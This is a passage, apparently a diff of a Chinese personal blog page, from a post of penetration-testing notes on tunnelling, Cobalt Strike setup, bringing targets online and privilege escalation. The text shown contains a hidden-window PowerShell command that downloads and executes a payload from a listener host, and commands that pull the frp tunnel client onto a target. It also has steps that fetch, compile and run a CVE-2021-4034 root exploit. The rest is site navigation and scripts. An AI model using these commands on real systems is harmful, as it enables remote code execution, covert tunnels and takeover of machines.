+<li>windows ：攻击-生成后门-Payload Generator，得到一串命令，默认保存在payload.txt。上传到kali，修改ip为对应ip<br><code>powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://10.45.214.249:9000/network-tools/payload.txt&#39;))&quot;;</code></li>
+</ul>
+<p>能执行命令之后。windows，用powershell下载文件到本地并执行。<strong>修改ip为kali对应ip，端口和路径</strong><br>powershell (new-object System.Net.WebClient).DownloadFile(‘<a href="http://10.45.214.249:9000/network-tools/frpc.exe&#39;,&#39;frpc.exe&#39;" target="_blank" rel="noopener">http://10.45.214.249:9000/network-tools/frpc.exe&#39;,&#39;frpc.exe&#39;</a>);<br>powershell (new-object System.Net.WebClient).DownloadFile(‘<a href="http://10.45.214.249:9000/network-tools//frpc.ini&#39;,&#39;frpc.ini&#39;" target="_blank" rel="noopener">http://10.45.214.249:9000/network-tools//frpc.ini&#39;,&#39;frpc.ini&#39;</a>);<br>frpc -c frpc.ini</p>
+<ul>
+<li>linux<br>wget <a href="http://10.45.214.249:9000/network-tools/frpc" target="_blank" rel="noopener">http://10.45.214.249:9000/network-tools/frpc</a><br>wget <a href="http://10.45.214.249:9000/network-tools/frpc.ini" target="_blank" rel="noopener">http://10.45.214.249:9000/network-tools/frpc.ini</a><br>./frpc -c ./frpc.ini</li>
+</ul>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul>
+<li>linux<br>wget <a href="http://10.45.214.249:9000/network-tools/CVE-2021-4034.tar.gz" target="_blank" rel="noopener">http://10.45.214.249:9000/network-tools/CVE-2021-4034.tar.gz</a><br>tar -zxvf CVE-2021-4034.tar.gz<br>cd CVE-2021-4034<br>make<br>./cve-2021-4034</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/03/01/poc%E5%90%88%E9%9B%86/" rel="next" title="poc合集">
+                <i class="fa fa-chevron-left"></i> poc合集
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/03/15/ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BAphp%E7%8E%AF%E5%A2%83/" rel="prev" title="ubuntu下搭建php环境并远程调试">
+                ubuntu下搭建php环境并远程调试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#端口转发"><span class="nav-number">1.</span> <span class="nav-text">端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#本地端口转发"><span class="nav-number">1.1.</span> <span class="nav-text">本地端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程端口转发"><span class="nav-number">1.2.</span> <span class="nav-text">远程端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态转发"><span class="nav-number">1.3.</span> <span class="nav-text">动态转发</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nps搭建步骤"><span class="nav-number">2.</span> <span class="nav-text">nps搭建步骤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#frp搭建步骤"><span class="nav-number">3.</span> <span class="nav-text">frp搭建步骤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cs安装服务端并配置"><span class="nav-number">4.</span> <span class="nav-text">Cs安装服务端并配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机上线"><span class="nav-number">5.</span> <span class="nav-text">靶机上线</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#提权"><span class="nav-number">6.</span> <span class="nav-text">提权</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">214.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
